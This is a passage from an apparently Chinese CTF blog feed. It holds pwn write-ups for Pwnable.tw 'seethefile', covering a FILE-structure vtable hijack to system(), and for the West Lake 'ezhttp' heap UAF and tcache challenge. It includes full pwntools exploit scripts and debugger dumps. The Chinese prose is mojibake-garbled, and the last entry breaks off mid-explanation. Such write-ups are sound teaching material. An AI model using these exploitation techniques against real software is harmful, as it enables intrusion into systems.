add(&#x27;a&#x27;+&#x27;\x00&#x27;,&#x27;a&#x27;*0x48+&#x27;\x00&#x27;,p64(libc.sym[&#x27;system&#x27;]))</span></span><br><span class="line"><span class="comment"># add(3,0x20,p64(elf.got[&#x27;printf&#x27;]))</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw seethefile</title>
      <link href="/2020/10/18/Pwnable_seethefile/"/>
      <url>/2020/10/18/Pwnable_seethefile/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwnable-tw-seethefile"><a href="#Pwnable-tw-seethefile" class="headerlink" title="Pwnable.tw seethefile"></a>Pwnable.tw seethefile</h3><blockquote><p>ç¬¬äºŒæ¬¡åšè¿™é“é¢˜äº†ï¼Œææ‡‚äº†ç¬¬ä¸€æ¬¡åšè¿™é¢˜ä¸æ‡‚çš„ä¸€äº›ç»†èŠ‚âœˆ</p></blockquote><span id="more"></span><p>ç¨‹åºå…è®¸æˆ‘ä»¬open_file,read_file,write_fileï¼Œå”¯ä¸€å‘ç°çš„æ¼æ´æ˜¯åœ¨leave_massageçš„æ—¶å€™è¾“å…¥nameå¯ä»¥è¦†å†™åˆ°bssä¸Šçš„fd.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Leave your name :&quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thank you %s ,see you next time\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">.bss:<span class="number">0804B</span>0C0 magicbuf        db <span class="number">1</span>A0h <span class="title function_">dup</span><span class="params">(?)</span>          ; DATA XREF: openfile+<span class="number">33</span>â†‘o</span><br><span class="line">.bss:<span class="number">0804B</span>0C0                                         ; readfile+<span class="number">17</span>â†‘o ...</span><br><span class="line">.bss:<span class="number">0804B</span>260                 public name</span><br><span class="line">.bss:<span class="number">0804B</span>260 name            db <span class="number">20</span>h <span class="title function_">dup</span><span class="params">(   ?)</span>        ; DATA XREF: main+<span class="number">9F</span>â†‘o</span><br><span class="line">.bss:<span class="number">0804B</span>260                                         ; main+B4â†‘o</span><br><span class="line">.bss:<span class="number">0804B</span>280 ; FILE *fp</span><br><span class="line">.bss:<span class="number">0804B</span>280 fp              dd ?                    ; DATA XREF: openfile+<span class="number">6</span>â†‘r</span><br><span class="line">.bss:<span class="number">0804B</span>280                                         ; openfile+ADâ†‘w ...</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”é¢˜ç›®åŠŸèƒ½æ˜¯åœ¨äºå¯¹æ–‡ä»¶çš„æ“ä½œï¼Œè°ƒç”¨fread,fwrite,fopen,fcloseï¼Œé‚£è¿™é¢˜å°±æ˜¯è€ƒå¯Ÿio_fileäº†ã€‚</p><p>å¯¹äºio_fileçš„åˆ©ç”¨ï¼Œä¸€èˆ¬æ˜¯ç›´æ¥è¦†ç›–vtableç»“æ„ä½“æŒ‡é’ˆæŒ‡å‘å¯æ§çš„å†…å­˜ï¼Œå†è€…å°±æ˜¯æ„é€ æ•´ä¸ªio_file_plusç»“æ„ä½“ï¼Œä½†è¿™ç§æ–¹æ³•è¦æ±‚æˆ‘ä»¬æ„é€ æ—¶è¦ç»•è¿‡ä¸€äº›æ£€æŸ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">_IO_acquire_lock (fp);</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">  status = _IO_file_close_it (fp);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">_IO_release_lock (fp);</span><br><span class="line">_IO_FINISH (fp);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦æ„é€ å‡º_IO_IS_FILEBUF&#x3D;0çš„_flagsï¼Œä½¿å¾—å¯ä»¥ç»•è¿‡ä¸Šé¢ä¸¤ä¸ªæ£€æµ‹ä¾‹å¦‚_flags&#x3D;0xffffdfffï¼ˆ<strong>åŸç†åœ¨äº0xdf&#x3D;(11011111),0x20&#x3D;(0010000),0xdf&amp;0x20&#x3D;&#x3D;0</strong>ï¼‰ï¼Œæœ€ç»ˆæ‰§è¡Œ_IO_FINISH (fp)ï¼›</p><p>åœ¨Cè¯­è¨€ä¸­ï¼ŒæˆåŠŸè°ƒç”¨fopenå‡½æ•°åä¼šåœ¨å †ä¸Šåˆ†é…ä¸€å—ç©ºé—´ç”¨äºå­˜æ”¾_IO_FILE_plusç»“æ„ä½“ï¼Œå¹¶ä¸”è¿”å›ç»“æ„ä½“çš„é¦–åœ°å€ï¼Œè€Œåœ¨è°ƒç”¨fcloseæ—¶ï¼Œæœ€ç»ˆä¼šé€šè¿‡io_file_plusé‡Œçš„vatbleè°ƒç”¨ç›¸åº”çš„å‡½æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x9003008 80</span><br><span class="line">00:0000â”‚   0x9003008 â—‚â€” 0x0</span><br><span class="line">01:0004â”‚   0x900300c â—‚â€” 0x161</span><br><span class="line">02:0008â”‚   0x9003010 â—‚â€” 0xfbad2488   //_flags</span><br><span class="line">03:000câ”‚   0x9003014 â€”â–¸ 0x900321d â—‚â€” 0xa5d6f73 (&#x27;so]\n&#x27;)  //io_read_ptr</span><br><span class="line">04:0010â”‚   0x9003018 â€”â–¸ 0x90033aa â—‚â€” 0x31203130 (&#x27;01 1&#x27;)  //io_read_end</span><br><span class="line">05:0014â”‚   0x900301c â€”â–¸ 0x9003170 â—‚â€” 0x30303030 (&#x27;0000&#x27;)  //io_read_base</span><br><span class="line">... â†“</span><br><span class="line">0a:0028â”‚   0x9003030 â€”â–¸ 0x9003570 â—‚â€” 0x0</span><br><span class="line">0b:002câ”‚   0x9003034 â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">0f:003câ”‚   0x9003044 â€”â–¸ 0xf7fa1cc0 (_IO_2_1_stderr_) â—‚â€” 0xfbad2086  //_chain</span><br><span class="line">10:0040â”‚   0x9003048 â—‚â€” 0x3</span><br><span class="line">11:0044â”‚   0x900304c â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">14:0050â”‚   0x9003058 â€”â–¸ 0x90030a8 â—‚â€” 0x0</span><br><span class="line">15:0054â”‚   0x900305c â—‚â€” 0xffffffff</span><br><span class="line">... â†“</span><br><span class="line">17:005câ”‚   0x9003064 â—‚â€” 0x0</span><br><span class="line">18:0060â”‚   0x9003068 â€”â–¸ 0x90030b4 â—‚â€” 0x0</span><br><span class="line">19:0064â”‚   0x900306c â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">1c:0070â”‚   0x9003078 â—‚â€” 0xffffffff</span><br><span class="line">1d:0074â”‚   0x900307c â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">27:009câ”‚   0x90030a4 â€”â–¸ 0xf7fa0ac0 (_IO_file_jumps) â—‚â€” 0x0  //vatable</span><br><span class="line">28:00a0â”‚   0x90030a8 â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">pwndbg&gt; telescope 0xf7fa0ac0 30</span><br><span class="line">00:0000â”‚   0xf7fa0ac0 (_IO_file_jumps) â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">02:0008â”‚   0xf7fa0ac8 (_IO_file_jumps+8) â€”â–¸ 0xf7e57990 (_IO_file_finish) â—‚â€” push   ebx</span><br><span class="line">03:000câ”‚   0xf7fa0acc (_IO_file_jumps+12) â€”â–¸ 0xf7e583b0 (_IO_file_overflow) â—‚â€” push   edi</span><br><span class="line">04:0010â”‚   0xf7fa0ad0 (_IO_file_jumps+16) â€”â–¸ 0xf7e58150 (_IO_file_underflow) â—‚â€” push   ebp</span><br><span class="line">05:0014â”‚   0xf7fa0ad4 (_IO_file_jumps+20) â€”â–¸ 0xf7e59230 (_IO_default_uflow) â—‚â€” push   ebx</span><br><span class="line">06:0018â”‚   0xf7fa0ad8 (_IO_file_jumps+24) â€”â–¸ 0xf7e5a0c0 (_IO_default_pbackfail) â—‚â€” push   ebp</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬åªè¦æ„é€ å¥½_IO_FILE_plusç»“æ„ä½“ï¼Œå¹¶é€šè¿‡nameçš„æº¢å‡ºæ”¹fdæŒ‡å‘æˆ‘ä»¬æ„é€ çš„_IO_FILE_plusç»“æ„ä½“ï¼Œå†æ‰§è¡Œfcloseå³å¯å®Œæˆåˆ©ç”¨ã€‚</p><p>é¦–å…ˆè¦Leakï¼Œé¢˜ç›®ç»™äº†æˆ‘ä»¬ä»»æ„æ–‡ä»¶è¯»çš„æœºä¼šï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è¯»å–**â€™&#x2F;proc&#x2F;self&#x2F;mapsâ€™**ï¼ˆæ–‡ä»¶çš„å†…å­˜ä¿¡æ¯å­˜å‚¨äºæ­¤ï¼‰æ¥å¾—åˆ°libcåœ°å€ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯æ„é€ file_plusç»“æ„ä½“ï¼Œå‡ å¤„è¦ç‚¹ï¼š</p><p>1.æ„é€ _flag&#x3D;0xffffdfffï¼Œç»•è¿‡æ£€æµ‹å»æ‰§è¡Œ((struct IO_FILE_plus *)fp-&gt;vtable)-&gt;__finish(fp)</p><p>2.åœ¨fdæŒ‡å‘å†…å­˜çš„åç§»ä¸º0x4ä½ç½®å†™å…¥â€™;$0â€™ï¼Œ;ç”¨æ¥åˆ†éš”å‘½ä»¤ã€‚</p><p>3.io_fileç»“æ„ä½“å¤§å°ä¸º0x94ï¼Œå› æ­¤è¦å¡«å……æ»¡0x94ã€‚</p><p>4.vatbleæŒ‡é’ˆæŒ‡å‘ç´§æ¥ç€çš„fileç»“æ„ä½“çš„å†…å­˜ï¼Œæ–¹ä¾¿åé¢çš„æ„é€ ã€‚</p><p>5.vtableç»“æ„ä½“å¯¹åº”çš„__finishå‡½æ•°æŒ‡é’ˆ(ç¬¬3ä¸ªä½ç½®)å†™ä¸ºsystem()</p><p>fake_struct:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x804b300 80</span><br><span class="line">00:0000â”‚ eax  0x804b300 â—‚â€” 0xffffdfff</span><br><span class="line">01:0004â”‚      0x804b304 â—‚â€” 0x30243b /* &#x27;;$0&#x27; */</span><br><span class="line">02:0008â”‚      0x804b308 â—‚â€” 0x0</span><br><span class="line">... â†“</span><br><span class="line">25:0094â”‚      0x804b394 â€”â–¸ 0x804b398 â€”â–¸ 0xf7e28db0 (system) â—‚â€” sub    esp, 0xc</span><br><span class="line">26:0098â”‚      0x804b398 â€”â–¸ 0xf7e28db0 (system) â—‚â€” sub    esp, 0xc</span><br><span class="line">... â†“</span><br><span class="line">29:00a4â”‚      0x804b3a4 â—‚â€” 0x0</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ((struct IO_FILE_plus *)fp-&gt;vtable)-&gt;__finish(fp)ç›¸å½“äºæ‰§è¡Œsystem(â€œxxx;$0â€)å¾—åˆ°shellğŸš©</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openfile</span>(<span class="params">name</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to see :&#x27;</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readfile</span>():</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writefile</span>():</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closefile</span>():</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>(<span class="params">name</span>):</span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Leave your name :&quot;</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">1234</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p=remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=process(<span class="string">&quot;./seethefile&quot;</span>)</span><br><span class="line"></span><br><span class="line">openfile(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">readfile()</span><br><span class="line">readfile()</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">p.recvline()</span><br><span class="line">libc.address=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)-<span class="number">0x1b4000</span>+<span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&quot;libc : &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">fake_struct=<span class="number">0x0804B300</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(fake_struct)   <span class="comment">#fd-&gt;fake_struct</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*(fake_struct-<span class="number">0x0804B280</span>-<span class="number">4</span>)</span><br><span class="line">payload+=<span class="string">&#x27;\xff\xdf\xff\xff;$0\x00&#x27;</span>.ljust(<span class="number">0x94</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p32(fake_struct+<span class="number">0x98</span>)</span><br><span class="line">payload+=p32(libc.sym[<span class="string">&#x27;system&#x27;</span>])*<span class="number">3</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b*0x08048B0F&#x27;</span>)</span><br><span class="line">leave(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>fcloseéƒ¨åˆ†æºç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* libio/iofclose.c */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*è¿™é‡Œæœ¬æ¥æœ‰ä¸ªå¯¹ç‰ˆæœ¬è¿›è¡Œæ£€æµ‹çš„ä»£ç ï¼Œæ ¹æ®FILEç»“æ„ä¸­_vtable_offsetå˜é‡æ˜¯å¦ä¸º0æ¥åˆ¤æ–­ï¼Œä¸ä¸º0åˆ™æ‰§è¡Œ_IO_old_fclose*/</span></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);  <span class="comment">// unlinkå³ï¼šå°†fpæŒ‡å‘çš„FILEç»“æ„ä½“ä»_IO_list_allçš„å•å‘é“¾è¡¨ä¸­å–ä¸‹</span></span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);   <span class="comment">//å…³é—­fp</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _LIBC</span></span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">     the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒåšæ–‡:<br>(<a href="https://www.jianshu.com/p/0176ebe02354">https://www.jianshu.com/p/0176ebe02354</a>)</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¥¿æ¹–è®ºå‰‘</title>
      <link href="/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91_Quals_ezhttp/"/>
      <url>/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91_Quals_ezhttp/</url>
      
        <content type="html"><![CDATA[<h3 id="è¥¿æ¹–è®ºå‰‘-ezhttp"><a href="#è¥¿æ¹–è®ºå‰‘-ezhttp" class="headerlink" title="è¥¿æ¹–è®ºå‰‘ ezhttp"></a>è¥¿æ¹–è®ºå‰‘ ezhttp</h3><blockquote><p>èŠ±äº†ä¸€ä¸‹åˆåšè¿™é¢˜ï¼Œè¢«æ²¡æœ‰ç¬¦å·è¡¨çš„libcæŠ˜ç£¨çš„æ­»å»æ´»æ¥ï¼Œä¸çŸ¥é“ä¸ºå•¥æˆ‘ç”µè„‘ubuntu18çš„libcTMå‡çº§åˆ°1.3çš„æ²¡æ³•tcache double freeäº†ï¼Œèµ›åè‡ªå·±ç¼–è¯‘äº†ä¸€ä¸ªå¸¦dbgç¬¦å·çš„ï¼Œå†ld_preloadå°±å¯ä»¥äº†ã€‚</p></blockquote><p>è¿™é¢˜æ˜¯é“å¥—äº†å±‚ç±»ä¼¼httpæ”¶å‘å½¢å¼çš„å †ä½“ï¼Œé€†è¿™ä¸ªæ”¶å‘èŠ±è´¹äº†å¤§éƒ¨åˆ†çš„æ—¶é—´ï¼Œè¿™ä¸ªå°±æ²¡ä»€ä¹ˆå¥½è¯´çš„äº†ï¼Œåªè¦å†™ä¸‹åé¢çš„åˆ©ç”¨æ‰‹æ®µå§ï¼š</p><span id="more"></span><p>addå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v2 = <span class="built_in">strlen</span>(&amp;src);</span><br><span class="line">  heaplist[<span class="number">2</span> * i] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="keyword">if</span> ( !heaplist[<span class="number">2</span> * i] )</span><br><span class="line">  &#123;</span><br><span class="line">    quit((__int64)<span class="string">&quot;HTTP/1.1 500 INTERNAL SERVER ERROR&quot;</span>, (__int64)<span class="string">&quot;Something error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  heaplist[<span class="number">2</span> * i + <span class="number">1</span>] = (<span class="type">void</span> *)<span class="built_in">strlen</span>(&amp;src);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;src);</span><br><span class="line">  <span class="built_in">strncpy</span>((<span class="type">char</span> *)heaplist[<span class="number">2</span> * i], &amp;src, v3);</span><br></pre></td></tr></table></figure><p>  çœ‹åˆ°å®ƒæ˜¯ç”¨strlenè·å–contentçš„é•¿åº¦ï¼Œä¹‹åmallocå†strncpyï¼Œstrlenä¼šè¢«â€™\x00â€™æˆªæ–­ï¼Œåœ¨åé¢æ„é€ æ—¶ç»™æˆ‘å¸¦æ¥äº†ä¸å°‘çš„éº»çƒ¦ã€‚</p><p>  deleå‡½æ•°æœ‰uaf:<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(heaplist[<span class="number">2</span> * idx]);</span><br><span class="line">heaplist[<span class="number">2</span> * idx + <span class="number">1</span>] = <span class="number">0LL</span>;                  <span class="comment">// UAF</span></span><br><span class="line">quit((__int64)<span class="string">&quot;HTTP/1.1 200 OK&quot;</span>, (__int64)<span class="string">&quot;Delete success!&quot;</span>);</span><br></pre></td></tr></table></figure></p><p>  editè¿˜æ˜¯æ­£å¸¸çš„ï¼Œå“¦å¯¹ç»“å°¾åŠ ä¸ªâ€™\nâ€™ï¼š<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; src[i] != <span class="string">&#x27;\n&#x27;</span>; ++i )</span><br><span class="line">  ;</span><br><span class="line"><span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> || v4 &gt; <span class="number">15</span> || !heaplist[<span class="number">2</span> * v4] || i &gt; (__int64)heaplist[<span class="number">2</span> * v4 + <span class="number">1</span>] )</span><br><span class="line">&#123;</span><br><span class="line">  quit((__int64)<span class="string">&quot;HTTP/1.1 404 Not Found&quot;</span>, (__int64)<span class="string">&quot;No!You can&#x27;t&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(heaplist[<span class="number">2</span> * v4], src, i);</span><br></pre></td></tr></table></figure></p><p>ç”±äºæ²¡æœ‰showï¼Œaddå‡½æ•°ç»™äº†æˆ‘ä»¬å †åœ°å€å› æ­¤è‡ªç„¶æƒ³åˆ°double freeæ‰“tcacheçš„ç»“æ„ä½“ï¼Œä¹‹ådele0x100çš„å †è¿›å…¥unsortedbinå†™å…¥main_arenaåœ°å€ï¼Œdouble freeåŒæ—¶æ”¹main_arenaå2å­—èŠ‚æ¥æ‰“stdoutï¼Œä½†ç”±äºaddæ—¶çš„â€™\x00â€™é™åˆ¶ï¼Œè¦æ”¹å†™åœ°å€ä¸ºstdoutä¸Šé¢çš„åœ°å€ï¼Œå¹¶å¡«å……â€™aâ€™ä½†0xfbad18ä¸èƒ½æ”¹ï¼Œå…¶ä»–éƒ½å¡«â€™aâ€™ï¼Œå¼€å§‹ä»¥ä¸ºä¸è¡Œï¼Œä½†ä»èƒ½æˆåŠŸæ³„éœ²ï¼Œæœ‰ç‚¹nbï¼Œä¹‹åç”±äºæœ‰seccompæ‰€ä»¥æ”¹free_hookä¸ºsetcontext+53ï¼Œå¹¶åœ¨0x100çš„å †é‡Œå†™payloadï¼Œä¹‹ådeleã€‚åˆ©ç”¨setcontext+53æ¥æ„é€ 